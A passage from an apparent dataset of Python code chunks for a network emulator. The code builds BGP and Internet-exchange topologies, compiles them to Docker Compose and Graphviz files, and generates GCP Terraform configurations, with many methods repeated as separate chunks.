hosts_per_stub_as)\n    \n\n    ###############################################################################\n    # Peering via RS (route server). The default peering mode for RS is PeerRelationship.Peer, \n    # which means each AS will only export its customers and their own prefixes. \n    # We will use this peering relationship to peer all the ASes in an IX.\n    # None of them will provide transit service for others. \n\n    ebgp.addRsPeers(100, [2, 3, 4])\n    ebgp.addRsPeers(102, [2, 4])\n    ebgp.addRsPeers(104, [3, 4])\n\n    # To buy transit services from another autonomous system, \n    # we will use private peering  \n\n    ebgp.addPrivatePeerings(100, [2],  [150, 151], PeerRelationship.Provider)\n    ebgp.addPrivatePeerings(100, [3],  [150], PeerRelationship.Provider)\n\n    ebgp.addPrivatePeerings(101, [2],  [12], PeerRelationship.Provider)\n    ebgp.addPrivatePeerings(101, [12], [152, 153], PeerRelationship.Provider)\n\n    ebgp.addPrivatePeerings(102, [2, 4],  [154], PeerRelationship.Provider)\n\n    ebgp.addPrivatePeerings(103, [3],  [160, 161, 162], PeerRelationship.Provider)\n\n    ebgp.addPrivatePeerings(104, [3, 4], [12], PeerRelationship.Provider)\n    ebgp.addPrivatePeerings(104, [4],  [163], PeerRelationship.Provider)\n    ebgp.addPrivatePeerings(104, [12], [164], PeerRelationship.Provider)\n\n    # Add layers to the emulator\n    emu.addLayer(base)\n    emu.addLayer(routing)\n    emu.addLayer(ebgp)\n    emu.addLayer(ibgp)\n    emu.addLayer(ospf)\n\n    return emu",
  "def makeEmulatorBaseWith5StubASAndHosts(hosts_per_stub_as: int) -> Emulator:\n    ###############################################################################\n    emu     = Emulator()\n    base    = Base()\n    routing = Routing()\n    ebgp    = Ebgp()\n    ibgp    = Ibgp()\n    ospf    = Ospf()\n\n\n    ###############################################################################\n\n    ix100 = base.createInternetExchange(100)\n    ix101 = base.createInternetExchange(101)\n    ix102 = base.createInternetExchange(102)\n    ix103 = base.createInternetExchange(103)\n    ix104 = base.createInternetExchange(104)\n\n    # Customize names (for visualization purpose)\n    ix100.getPeeringLan().setDisplayName('NYC-100')\n    ix101.getPeeringLan().setDisplayName('San Jose-101')\n    ix102.getPeeringLan().setDisplayName('Chicago-102')\n    ix103.getPeeringLan().setDisplayName('Miami-103')\n    ix104.getPeeringLan().setDisplayName('Boston-104')\n\n\n    ###############################################################################\n    # Create Transit Autonomous Systems \n\n    ## Tier 1 ASes\n    makeTransitAs(base, 2, [100, 101, 102], \n        [(100, 101), (101, 102)] \n    )\n\n    makeTransitAs(base, 3, [100, 103, 104], \n        [(100, 103), (103, 104)]\n    )\n\n    makeTransitAs(base, 4, [100, 102, 104], \n        [(100, 104), (102, 104)]\n    )\n\n    ## Tier 2 ASes\n    makeTransitAs(base, 12, [101, 104], [(101, 104)])\n\n\n    ###############################################################################\n    # Create single-homed stub ASes. \"None\" means create a host only \n\n    makeStubAsWithHosts(emu, base, 150, 100, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 151, 100, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 152, 101, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 153, 101, hosts_per_stub_as)\n    makeStubAsWithHosts(emu, base, 154, 102, hosts_per_stub_as)\n    \n\n    ###############################################################################\n    # Peering via RS (route server). The default peering mode for RS is PeerRelationship.Peer, \n    # which means each AS will only export its customers and their own prefixes. \n    # We will use this peering relationship to peer all the ASes in an IX.\n    # None of them will provide transit service for others. \n\n    ebgp.addRsPeers(100, [2, 3, 4])\n    ebgp.addRsPeers(102, [2, 4])\n    ebgp.addRsPeers(104, [3, 4])\n\n    # To buy transit services from another autonomous system, \n    # we will use private peering  \n\n    ebgp.addPrivatePeerings(100, [2],  [150, 151], PeerRelationship.Provider)\n    ebgp.addPrivatePeerings(100, [3],  [150], PeerRelationship.Provider)\n\n    ebgp.addPrivatePeerings(101, [2],  [12], PeerRelationship.Provider)\n    ebgp.addPrivatePeerings(101, [12], [152, 153], PeerRelationship.Provider)\n\n    ebgp.addPrivatePeerings(102, [2, 4],  [154], PeerRelationship.Provider)\n\n\n    # Add layers to the emulator\n    emu.addLayer(base)\n    emu.addLayer(routing)\n    emu.addLayer(ebgp)\n    emu.addLayer(ibgp)\n    emu.addLayer(ospf)\n\n    return emu",
  "class DistributedDocker(Docker):\n    \"\"\"!\n    @brief The DistributedDocker compiler class.\n\n    DistributedDocker is one of the compiler driver. It compiles the lab to\n    docker containers. This compiler will generate one set of containers with\n    their docker-compose.yml for each AS, enable you to run the emulator\n    distributed. \n\n    This works by making every IX network overlay network. \n    \"\"\"\n\n    def __init__(self, namingScheme: str = \"as{asn}{role}-{name}-{primaryIp}\"):\n        \"\"\"!\n        @brief DistributedDocker compiler constructor.\n\n        @param namingScheme (optional) node naming scheme. Available variables\n        are: {asn}, {role} (r - router, h - host, rs - route server), {name},\n        {primaryIp}\n        \"\"\"\n        super().__init__(namingScheme)\n\n    def getName(self) -> str:\n        return 'DistributedDocker'\n\n    def __compileIxNetMaster(self, net) -> str:\n        (scope, _, _) = net.getRegistryInfo()\n        return DistributedDockerCompilerFileTemplates['compose_network_ix_master'].format(\n            netId = '{}{}'.format(self._contextToPrefix(scope, 'net'), net.getName()),\n            prefix = net.getPrefix(),\n            labelList = self._getNetMeta(net)\n        )\n\n    def __compileIxNetWorker(self, net) -> str:\n        (scope, _, _) = net.getRegistryInfo()\n        return DistributedDockerCompilerFileTemplates['compose_network_ix_worker'].format(\n            netId = '{}{}'.format(self._contextToPrefix(scope, 'net'), net.getName()),\n            labelList = self._getNetMeta(net)\n        )\n\n    def _doCompile(self, emulator: Emulator):\n        registry = emulator.getRegistry()\n        scopes = set()\n        for (scope, _, _) in registry.getAll().keys(): scopes.add(scope)\n\n        ix_nets = ''\n\n        for ixnet in ScopedRegistry('ix', registry).getByType('net'):\n            ix_nets += self.__compileIxNetWorker(ixnet)\n\n        for scope in scopes:\n            mkdir(scope)\n            chdir(scope)\n\n            services = ''\n            networks = ''\n\n            for ((_scope, type, name), obj) in registry.getAll().items():\n                if _scope != scope: continue\n\n                if type == 'rnode':\n                    self._log('compiling router node {} for as{}...'.format(name, scope))\n                    services += self._compileNode(obj)\n\n                if type == 'hnode':\n                    self._log('compiling host node {} for as{}...'.format(name, scope))\n                    services += self._compileNode(obj)\n\n                if type == 'rs':\n                    self._log('compiling rs node for {}...'.format(name))\n                    services += self._compileNode(obj)\n\n                if type == 'snode':\n                    self._log('compiling service node {}...'.format(name))\n                    services += self._compileNode(obj)\n\n                if type == 'net':\n                    self._log('creating network: {}/{}...'.format(scope, name))\n                    networks += self.__compileIxNetMaster(obj) if scope == 'ix' else self._compileNet(obj)\n\n            if len(services) > 0 or len(networks) > 0 :\n                if scope != 'ix': networks += ix_nets\n                self._log('creating docker-compose.yml...'.format(scope, name))\n                print(DockerCompilerFileTemplates['compose'].format(\n                    services = services,\n                    networks = networks,\n                    dummies = self._makeDummies()\n                ), file=open('docker-compose.yml', 'w'))\n\n                self._used_images = set()\n\n                print('COMPOSE_PROJECT_NAME=sim_{}'.format(scope), file=open('.env', 'w'))\n\n            chdir('..')\n\n            if services == '' and networks == '': rmdir(scope)",
  "def __init__(self, namingScheme: str = \"as{asn}{role}-{name}-{primaryIp}\"):\n        \"\"\"!\n        @brief DistributedDocker compiler constructor.\n\n        @param namingScheme (optional) node naming scheme. Available variables\n        are: {asn}, {role} (r - router, h - host, rs - route server), {name},\n        {primaryIp}\n        \"\"\"\n        super().__init__(namingScheme)",
  "def getName(self) -> str:\n        return 'DistributedDocker'",
  "def __compileIxNetMaster(self, net) -> str:\n        (scope, _, _) = net.getRegistryInfo()\n        return DistributedDockerCompilerFileTemplates['compose_network_ix_master'].format(\n            netId = '{}{}'.format(self._contextToPrefix(scope, 'net'), net.getName()),\n            prefix = net.getPrefix(),\n            labelList = self._getNetMeta(net)\n        )",
  "def __compileIxNetWorker(self, net) -> str:\n        (scope, _, _) = net.getRegistryInfo()\n        return DistributedDockerCompilerFileTemplates['compose_network_ix_worker'].format(\n            netId = '{}{}'.format(self._contextToPrefix(scope, 'net'), net.getName()),\n            labelList = self._getNetMeta(net)\n        )",
  "def _doCompile(self, emulator: Emulator):\n        registry = emulator.getRegistry()\n        scopes = set()\n        for (scope, _, _) in registry.getAll().keys(): scopes.add(scope)\n\n        ix_nets = ''\n\n        for ixnet in ScopedRegistry('ix', registry).getByType('net'):\n            ix_nets += self.__compileIxNetWorker(ixnet)\n\n        for scope in scopes:\n            mkdir(scope)\n            chdir(scope)\n\n            services = ''\n            networks = ''\n\n            for ((_scope, type, name), obj) in registry.getAll().items():\n                if _scope != scope: continue\n\n                if type == 'rnode':\n                    self._log('compiling router node {} for as{}...'.format(name, scope))\n                    services += self._compileNode(obj)\n\n                if type == 'hnode':\n                    self._log('compiling host node {} for as{}...'.format(name, scope))\n                    services += self._compileNode(obj)\n\n                if type == 'rs':\n                    self._log('compiling rs node for {}...'.format(name))\n                    services += self._compileNode(obj)\n\n                if type == 'snode':\n                    self._log('compiling service node {}...'.format(name))\n                    services += self._compileNode(obj)\n\n                if type == 'net':\n                    self._log('creating network: {}/{}...'.format(scope, name))\n                    networks += self.__compileIxNetMaster(obj) if scope == 'ix' else self._compileNet(obj)\n\n            if len(services) > 0 or len(networks) > 0 :\n                if scope != 'ix': networks += ix_nets\n                self._log('creating docker-compose.yml...'.format(scope, name))\n                print(DockerCompilerFileTemplates['compose'].format(\n                    services = services,\n                    networks = networks,\n                    dummies = self._makeDummies()\n                ), file=open('docker-compose.yml', 'w'))\n\n                self._used_images = set()\n\n                print('COMPOSE_PROJECT_NAME=sim_{}'.format(scope), file=open('.env', 'w'))\n\n            chdir('..')\n\n            if services == '' and networks == '': rmdir(scope)",
  "class Graphviz(Compiler):\n    \"\"\"!\n    @brief Get all graphable object and graph them.\n\n    \"\"\"\n\n    def __slugify(self, filename):\n        return ''.join([c for c in filename if c.isalpha() or c.isdigit() or c == ' ']).rstrip()\n\n    def getName(self) -> str:\n        return 'Graphviz'\n\n    def _doCompile(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        self._log('collecting graphs in the emulator...')\n\n        for obj in list(reg.getAll().values()):\n            cg = getattr(obj, 'createGraphs', None)\n\n            if not callable(cg): continue\n\n            graphs: Graphable = obj\n\n            graphs.createGraphs(emulator)\n            for graph in graphs.getGraphs().values():\n                self._log('found graph: {}'.format(graph.name))\n                print(graph.toGraphviz(), file=open('{}.dot'.format(self.__slugify(graph.name)), 'w'))",
  "def __slugify(self, filename):\n        return ''.join([c for c in filename if c.isalpha() or c.isdigit() or c == ' ']).rstrip()",
  "def getName(self) -> str:\n        return 'Graphviz'",
  "def _doCompile(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        self._log('collecting graphs in the emulator...')\n\n        for obj in list(reg.getAll().values()):\n            cg = getattr(obj, 'createGraphs', None)\n\n            if not callable(cg): continue\n\n            graphs: Graphable = obj\n\n            graphs.createGraphs(emulator)\n            for graph in graphs.getGraphs().values():\n                self._log('found graph: {}'.format(graph.name))\n                print(graph.toGraphviz(), file=open('{}.dot'.format(self.__slugify(graph.name)), 'w'))",
  "class DockerImage(object):\n    \"\"\"!\n    @brief The DockerImage class.\n\n    This class represents a candidate image for docker compiler.\n    \"\"\"\n\n    __software: Set[str]\n    __name: str\n    __local: bool\n    __dirName: str\n    __subset:DockerImage\n\n    def __init__(self, name: str, software: List[str], local: bool = False, dirName: str = None, subset: DockerImage = None) -> None:\n        \"\"\"!\n        @brief create a new docker image.\n\n        @param name name of the image. Can be name of a local image, image on\n        dockerhub, or image in private repo.\n        @param software set of software pre-installed in the image, so the\n        docker compiler can skip them when compiling.\n        @param local (optional) set this image as a local image. A local image\n        is built locally instead of pulled from the docker hub. Default to False.\n        @param dirName (optional) directory name of the local image (when local\n        is True). Default to None. None means use the name of the image.\n        \"\"\"\n        super().__init__()\n\n        self.__name = name\n        self.__software = set()\n        self.__local = local\n        self.__dirName = dirName if dirName != None else name\n        self.__subset = subset\n\n        for soft in software:\n            self.__software.add(soft)\n\n        self.__software = self._getAllInstalledSoftware()\n\n    def _getAllInstalledSoftware(self)->set:\n        if self.__subset == None:\n            return self.__software\n        else:\n            return self.__software.union(self.__subset._getAllInstalledSoftware())\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief get the name of this image.\n\n        @returns name.\n        \"\"\"\n        return self.__name\n\n    def getSoftware(self) -> Set[str]:\n        \"\"\"!\n        @brief get set of software installed on this image.\n        \n        @return set.\n        \"\"\"\n        return self.__software\n\n    def getDirName(self) -> str:\n        \"\"\"!\n        @brief returns the directory name of this image.\n\n        @return directory name.\n        \"\"\"\n        return self.__dirName\n    \n    def isLocal(self) -> bool:\n        \"\"\"!\n        @brief returns True if this image is local.\n\n        @return True if this image is local.\n        \"\"\"\n        return self.__local\n    \n    def addSoftwares(self, software) -> DockerImage:\n        \"\"\"!\n        @brief add softwares to this image.\n\n        @return self, for chaining api calls.\n        \"\"\"\n        for soft in software:\n            self.__software.add(soft)",
  "def __init__(self, name: str, software: List[str], local: bool = False, dirName: str = None, subset: DockerImage = None) -> None:\n        \"\"\"!\n        @brief create a new docker image.\n\n        @param name name of the image. Can be name of a local image, image on\n        dockerhub, or image in private repo.\n        @param software set of software pre-installed in the image, so the\n        docker compiler can skip them when compiling.\n        @param local (optional) set this image as a local image. A local image\n        is built locally instead of pulled from the docker hub. Default to False.\n        @param dirName (optional) directory name of the local image (when local\n        is True). Default to None. None means use the name of the image.\n        \"\"\"\n        super().__init__()\n\n        self.__name = name\n        self.__software = set()\n        self.__local = local\n        self.__dirName = dirName if dirName != None else name\n        self.__subset = subset\n\n        for soft in software:\n            self.__software.add(soft)\n\n        self.__software = self._getAllInstalledSoftware()",
  "def _getAllInstalledSoftware(self)->set:\n        if self.__subset == None:\n            return self.__software\n        else:\n            return self.__software.union(self.__subset._getAllInstalledSoftware())",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief get the name of this image.\n\n        @returns name.\n        \"\"\"\n        return self.__name",
  "def getSoftware(self) -> Set[str]:\n        \"\"\"!\n        @brief get set of software installed on this image.\n        \n        @return set.\n        \"\"\"\n        return self.__software",
  "def getDirName(self) -> str:\n        \"\"\"!\n        @brief returns the directory name of this image.\n\n        @return directory name.\n        \"\"\"\n        return self.__dirName",
  "def isLocal(self) -> bool:\n        \"\"\"!\n        @brief returns True if this image is local.\n\n        @return True if this image is local.\n        \"\"\"\n        return self.__local",
  "def addSoftwares(self, software) -> DockerImage:\n        \"\"\"!\n        @brief add softwares to this image.\n\n        @return self, for chaining api calls.\n        \"\"\"\n        for soft in software:\n            self.__software.add(soft)",
  "class GcpDistributedDocker(Compiler):\n    \"\"\"!\n    @brief The GcpDistributedDocker compiler class.\n\n    GcpDistributedDocker is one of the compiler driver. It compiles the lab to\n    sets of docker containers, and generate Terraform configuration for\n    deploying the lab to GCP.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'GcpDistributedDocker'\n\n    def __init_tf(self):\n        \"\"\"!\n        @brief Get files required by Terraform ready.\n        \"\"\"\n        self._log('initializing terraform environment...')\n        mkdir('_tf_scripts')\n        for file in ['_tf_scripts/get-swmtkn', '_tf_scripts/ssh-keygen', 'variables.tf', 'main.tf', 'network.tf', 'data.tf']:\n            print(GcpDistributedDockerFileTemplates[file], file=open(file, 'w'))\n        \n        for exfile in ['_tf_scripts/get-swmtkn', '_tf_scripts/ssh-keygen']:\n            chmod(exfile, 0o755)\n\n    def __make_tf(self, registry: Registry):\n        \"\"\"!\n        @brief Generate TF config for docker hosts.\n        \"\"\"\n        self._log('generating terraform configurations...')\n\n        print(GcpDistributedDockerFileTemplates['manager_tf_template'].format(\n            machineType = \"f1-micro\" # todo\n        ), file=open('manager.tf', 'w'))\n\n        scopes = set()\n\n        for (scope, type, _) in registry.getAll().keys():\n            if scope == 'ix': continue\n            if type == 'net' or type == 'hnode' or type == 'rnode' or type == 'snode':\n                scopes.add(scope)\n\n        for scope in scopes:\n            print(GcpDistributedDockerFileTemplates['worker_tf_template'].format(\n            machineType = \"f1-micro\", # todo\n            name = scope\n        ), file=open('worker-as{}.tf'.format(scope), 'w'))\n\n    def _doCompile(self, emulator: Emulator):\n        registry = emulator.getRegistry()\n        dcomp = DistributedDocker()\n        self.__init_tf()\n        self._log('generating container configurations...')\n        dcomp.compile(emulator, '_containers')\n        self.__make_tf(registry)",
  "def getName(self) -> str:\n        return 'GcpDistributedDocker'",
  "def __init_tf(self):\n        \"\"\"!\n        @brief Get files required by Terraform ready.\n        \"\"\"\n        self._log('initializing terraform environment...')\n        mkdir('_tf_scripts')\n        for file in ['_tf_scripts/get-swmtkn', '_tf_scripts/ssh-keygen', 'variables.tf', 'main.tf', 'network.tf', 'data.tf']:\n            print(GcpDistributedDockerFileTemplates[file], file=open(file, 'w'))\n        \n        for exfile in ['_tf_scripts/get-swmtkn', '_tf_scripts/ssh-keygen']:\n            chmod(exfile, 0o755)",
  "def __make_tf(self, registry: Registry):\n        \"\"\"!\n        @brief Generate TF config for docker hosts.\n        \"\"\"\n        self._log('generating terraform configurations...')\n\n        print(GcpDistributedDockerFileTemplates['manager_tf_template'].format(\n            machineType = \"f1-micro\" # todo\n        ), file=open('manager.tf', 'w'))\n\n        scopes = set()\n\n        for (scope, type, _) in registry.getAll().keys():\n            if scope == 'ix': continue\n            if type == 'net' or type == 'hnode' or type == 'rnode' or type == 'snode':\n                scopes.add(scope)\n\n        for scope in scopes:\n            print(GcpDistributedDockerFileTemplates['worker_tf_template'].format(\n            machineType = \"f1-micro\", # todo\n            name = scope\n        ), file=open('worker-as{}.tf'.format(scope), 'w'))",
  "def _doCompile(self, emulator: Emulator):\n        registry = emulator.getRegistry()\n        dcomp = DistributedDocker()\n        self.__init_tf()\n        self._log('generating container configurations...')\n        dcomp.compile(emulator, '_containers')\n        self.__make_tf(registry)",
  "class Docker(Compiler):\n    \"\"\"!\n    @brief The Docker compiler class.\n\n    Docker is one of the compiler driver. It compiles the lab to docker\n    containers.\n    \"\"\"\n\n    __services: str\n    __networks: str\n    __naming_scheme: str\n    __self_managed_network: bool\n    __dummy_network_pool: Generator[IPv4Network, None, None]\n\n    __internet_map_enabled: bool\n    __internet_map_port: int\n\n    __ether_view_enabled: bool\n    __ether_view_port: int\n\n    __client_hide_svcnet: bool\n\n    __images: Dict[str, Tuple[DockerImage, int]]\n    __forced_image: str\n    __disable_images: bool\n    __image_per_node_list: Dict[Tuple[str, str], DockerImage]\n    _used_images: Set[str]\n\n    def __init__(\n        self,\n        namingScheme: str = \"as{asn}{role}-{displayName}-{primaryIp}\",\n        selfManagedNetwork: bool = False,\n        dummyNetworksPool: str = '10.128.0.0/9',\n        dummyNetworksMask: int = 24,\n        internetMapEnabled: bool = False,\n        internetMapPort: int = 8080,\n        etherViewEnabled: bool = False,\n        etherViewPort: int = 5000,\n        clientHideServiceNet: bool = True\n    ):\n        \"\"\"!\n        @brief Docker compiler constructor.\n\n        @param namingScheme (optional) node naming scheme. Available variables\n        are: {asn}, {role} (r - router, h - host, rs - route server), {name},\n        {primaryIp} and {displayName}. {displayName} will automatically fall\n        back to {name} if\n        Default to as{asn}{role}-{displayName}-{primaryIp}.\n        @param selfManagedNetwork (optional) use self-managed network. Enable\n        this to manage the network inside containers instead of using docker's\n        network management. This works by first assigning \"dummy\" prefix and\n        address to containers, then replace those address with \"real\" address\n        when the containers start. This will allow the use of overlapping\n        networks in the emulation and will allow the use of the \".1\" address on\n        nodes. Note this will break port forwarding (except for service nodes\n        like real-world access node and remote access node.) Default to False.\n        @param dummyNetworksPool (optional) dummy networks pool. This should not\n        overlap with any \"real\" networks used in the emulation, including\n        loopback IP addresses. Default to 10.128.0.0/9.\n        @param dummyNetworksMask (optional) mask of dummy networks. Default to\n        24.\n        @param internetMapEnabled (optional) set if seedemu internetMap should be enabled.\n        Default to False. Note that the seedemu internetMap allows unauthenticated\n        access to all nodes, which can potentially allow root access to the\n        emulator host. Only enable seedemu in a trusted network.\n        @param internetMapPort (optional) set seedemu internetMap port. Default to 8080.\n        @param etherViewEnabled (optional) set if seedemu EtherView should be enabled.\n        Default to False.\n        @param etherViewPort (optional) set seedemu EtherView port. Default to 5000.\n        @param clientHideServiceNet (optional) hide service network for the\n        client map by not adding metadata on the net. Default to True.\n        \"\"\"\n        self.__networks = \"\"\n        self.__services = \"\"\n        self.__naming_scheme = namingScheme\n        self.__self_managed_network = selfManagedNetwork\n        self.__dummy_network_pool = IPv4Network(dummyNetworksPool).subnets(new_prefix = dummyNetworksMask)\n\n        self.__internet_map_enabled = internetMapEnabled\n        self.__internet_map_port = internetMapPort\n\n        self.__ether_view_enabled = etherViewEnabled\n        self.__ether_view_port = etherViewPort\n\n        self.__client_hide_svcnet = clientHideServiceNet\n\n        self.__images = {}\n        self.__forced_image = None\n        self.__disable_images = False\n        self._used_images = set()\n        self.__image_per_node_list = {}\n\n        for name, image in BASESYSTEM_DOCKERIMAGE_MAPPING.items():\n            priority = 0\n            if name == BaseSystem.DEFAULT:\n                priority = 1\n            self.addImage(image, priority=priority)\n\n    def getName(self) -> str:\n        return \"Docker\"\n\n    def addImage(self, image: DockerImage, priority: int = -1) -> Docker:\n        \"\"\"!\n        @brief add an candidate image to the compiler.\n\n        @param image image to add.\n        @param priority (optional) priority of this image. Used when one or more\n        images with same number of missing software exist. The one with highest\n        priority wins. If two or more images with same priority and same number\n        of missing software exist, the one added the last will be used. All\n        built-in images has priority of 0. Default to -1. All built-in images are\n        prior to the added candidate image. To set a candidate image to a node,\n        use setImageOverride() method.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        assert image.getName() not in self.__images, 'image with name {} already exists.'.format(image.getName())\n\n        self.__images[image.getName()] = (image, priority)\n\n        return self\n\n    def getImages(self) -> List[Tuple[DockerImage, int]]:\n        \"\"\"!\n        @brief get list of images configured.\n\n        @returns list of tuple of images and priority.\n        \"\"\"\n\n        return list(self.__images.values())\n\n    def forceImage(self, imageName: str) -> Docker:\n        \"\"\"!\n        @brief forces the docker compiler to use a image, identified by the\n        imageName. Image with such name must be added to the docker compiler\n        with the addImage method, or the docker compiler will fail at compile\n        time. Set to None to disable the force behavior.\n\n        @param imageName name of the image.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        self.__forced_image = imageName\n\n        return self\n\n    def disableImages(self, disabled: bool = True) -> Docker:\n        \"\"\"!\n        @brief forces the docker compiler to not use any images and build\n        everything for starch. Set to False to disable the behavior.\n\n        @param disabled (option) disabled image if True. Default to True.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        self.__disable_images = disabled\n\n        return self\n\n    def setImageOverride(self, node:Node, imageName:str) -> Docker:\n        \"\"\"!\n        @brief set the docker compiler to use a image on the specified Node.\n\n        @param node target node to override image.\n        @param imageName name of the image to use.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        asn = node.getAsn()\n        name = node.getName()\n        self.__image_per_node_list[(asn, name)]=imageName\n\n    def _groupSoftware(self, emulator: Emulator):\n        \"\"\"!\n        @brief Group apt-get install calls to maximize docker cache.\n\n        @param emulator emulator to load nodes from.\n        \"\"\"\n\n        registry = emulator.getRegistry()\n\n        # { [imageName]: { [softName]: [nodeRef] } }\n        softGroups: Dict[str, Dict[str, List[Node]]] = {}\n\n        # { [imageName]: useCount }\n        groupIter: Dict[str, int] = {}\n\n        for ((scope, type, name), obj) in registry.getAll().items():\n            if type not in ['rnode', 'csnode', 'hnode', 'snode', 'rs', 'snode']:\n                continue\n\n            node: Node = obj\n\n            (img, _) = self._selectImageFor(node)\n            imgName = img.getName()\n\n            if not imgName in groupIter:\n                groupIter[imgName] = 0\n\n            groupIter[imgName] += 1\n\n            if not imgName in softGroups:\n                softGroups[imgName] = {}\n\n            group = softGroups[imgName]\n\n            for soft in node.getSoftware():\n                if soft not in group:\n                    group[soft] = []\n                group[soft].append(node)\n\n        for (key, val) in softGroups.items():\n            maxIter = groupIter[key]\n            self._log('grouping software for image \"{}\" - {} references.'.format(key, maxIter))\n            step = 1\n\n            for commRequired in range(maxIter, 0, -1):\n                currentTier: Set[str] = set()\n                currentTierNodes: Set[Node] = set()\n\n                for (soft, nodes) in val.items():\n                    if len(nodes) == commRequired:\n                        currentTier.add(soft)\n                        for node in nodes: currentTierNodes.add(node)\n\n                for node in currentTierNodes:\n                    if not node.hasAttribute('__soft_install_tiers'):\n                        node.setAttribute('__soft_install_tiers', [])\n\n                    node.getAttribute('__soft_install_tiers').append(currentTier)\n\n\n                if len(currentTier) > 0:\n                    self._log('the following software has been grouped together in step {}: {} since they are referenced by {} nodes.'.format(step, currentTier, len(currentTierNodes)))\n                    step += 1\n\n\n    def _selectImageFor(self, node: Node) -> Tuple[DockerImage, Set[str]]:\n        \"\"\"!\n        @brief select image for the given node.\n\n        @param node node.\n\n        @returns tuple of selected image and set of missing software.\n        \"\"\"\n        nodeSoft = node.getSoftware()\n        nodeKey = (node.getAsn(), node.getName())\n\n        # #1 Highest Priority (User Custom Image)\n        if nodeKey in self.__image_per_node_list:\n            image_name = self.__image_per_node_list[nodeKey]\n\n            assert image_name in self.__images, 'image-per-node configured, but image {} does not exist.'.format(image_name)\n\n            (image, _) = self.__images[image_name]\n\n            self._log('image-per-node configured, using {}'.format(image.getName()))\n            return (image, nodeSoft - image.getSoftware())\n\n        # Should we keep this feature?\n        if self.__disable_images:\n            self._log('disable-imaged configured, using base image.')\n            (image, _) = self.__images['ubuntu:20.04']\n            return (image, nodeSoft - image.getSoftware())\n\n        # Set Default Image for All Nodes\n        if self.__forced_image != None:\n            assert self.__forced_image in self.__images, 'forced-image configured, but image {} does not exist.'.format(self.__forced_image)\n\n            (image, _) = self.__images[self.__forced_image]\n\n            self._log('force-image configured, using image: {}'.format(image.getName()))\n\n            return (image, nodeSoft - image.getSoftware())\n            \n        #Maintain a table : Virtual Image Name - Actual Image Name \n        image = BASESYSTEM_DOCKERIMAGE_MAPPING[node.getBaseSystem()]\n\n        return (image, nodeSoft - image.getSoftware())\n        \n        # candidates: List[Tuple[DockerImage, int]] = []\n        # minMissing = len(nodeSoft)\n        # for (image, prio) in self.__images.values():\n        #     missing = len(nodeSoft - image.getSoftware())\n\n        #     if missing < minMissing:\n        #         candidates = []\n        #         minMissing = missing\n        #     if missing <= minMissing: \n        #         candidates.append((image, prio))\n        \n        # assert len(candidates) > 0, '_electImageFor ended w/ no images?'\n\n        # (selected, maxPrio) = candidates[0]\n\n        # for (candidate, prio) in candidates:\n        #     if prio >= maxPrio:\n        #         maxPrio = prio\n        #         selected = candidate\n\n        # return (selected, nodeSoft - selected.getSoftware())\n\n\n    def _getNetMeta(self, net: Network) -> str:\n        \"\"\"!\n        @brief get net metadata labels.\n\n        @param net net object.\n\n        @returns metadata labels string.\n        \"\"\"\n\n        (scope, type, name) = net.getRegistryInfo()\n\n        labels = ''\n\n        if self.__client_hide_svcnet and scope == 'seedemu' and name == '000_svc':\n            return DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'dummy',\n                value = 'dummy label for hidden node/net'\n            )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'type',\n            value = 'global' if scope == 'ix' else 'local'\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'scope',\n            value = scope\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'name',\n            value = name\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'prefix',\n            value = net.getPrefix()\n        )\n\n        if net.getDisplayName() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'displayname',\n                value = net.getDisplayName()\n            )\n\n        if net.getDescription() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'description',\n                value = net.getDescription()\n            )\n\n        return labels\n\n    def _getNodeMeta(self, node: Node) -> str:\n        \"\"\"!\n        @brief get node metadata labels.\n\n        @param node node object.\n\n        @returns metadata labels string.\n        \"\"\"\n        (scope, type, name) = node.getRegistryInfo()\n\n        labels = ''\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'asn',\n            value = node.getAsn()\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'nodename',\n            value = name\n        )\n\n        if type == 'hnode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Host'\n            )\n\n        if type == 'rnode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Router'\n            )\n\n        if type == 'csnode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'SCION Control Service'\n            )\n\n        if type == 'snode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Emulator Service Worker'\n            )\n\n        if type == 'rs':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Route Server'\n            )\n\n        if node.getDisplayName() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'displayname',\n                value = node.getDisplayName()\n            )\n\n        if node.getDescription() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'description',\n                value = node.getDescription()\n            )\n\n        if len(node.getClasses()) > 0:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'class',\n                value = json.dumps(node.getClasses()).replace(\"\\\"\", \"\\\\\\\"\")\n            )\n\n        for key, value in node.getLabel().items():\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = key,\n                value = value\n            )\n        n = 0\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'net.{}.name'.format(n),\n                value = net.getName()\n            )\n\n            